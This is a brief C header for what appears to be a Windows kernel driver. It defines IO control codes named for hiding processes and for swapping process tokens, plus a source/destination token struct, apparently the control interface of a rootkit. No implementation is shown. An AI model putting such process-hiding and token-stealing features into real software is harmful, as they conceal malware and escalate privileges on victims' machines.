/*
 * ioctl_globals.h
 *
 * Description: Defines custom IO control codes and structures used to
 * communicate with the driver.
 */

#ifndef _IOCTL_GLOBALS_H_
#define _IOCTL_GLOBALS_H_

#define IO_HIDE_PROC        CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2890, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IO_PID_PROC         CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2891, METHOD_BUFFERED, FILE_ANY_ACCESS)
#define IO_TOKEN_PROC       CTL_CODE(FILE_DEVICE_UNKNOWN, 0x2892, METHOD_BUFFERED, FILE_ANY_ACCESS)

typedef struct {
        ULONG src;
        ULONG dest;
} token_tuple;

#endif